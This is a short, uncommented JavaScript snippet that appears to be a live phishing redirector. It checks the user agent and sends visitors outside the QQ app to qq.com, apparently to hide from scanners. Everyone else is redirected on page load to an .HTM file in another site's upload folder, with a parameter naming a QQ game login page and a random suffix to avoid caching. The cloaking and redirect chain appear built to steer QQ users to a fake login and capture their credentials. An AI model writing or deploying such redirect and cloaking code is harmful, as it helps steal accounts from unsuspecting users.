function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

leleua();

window.onload = function () {
    const targetUrl = 'http://www.360tianma.com/public/upload/conf/2024/01-11/38db6050a87abdd15393b354437fedc5.HTM?url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html';
    const timestamp = Date.now();
    const randomString = Math.random().toString(36).substring(2);
    const urlWithParam = `${targetUrl}u${timestamp}${randomString}`;
    window.location.href = urlWithParam
}
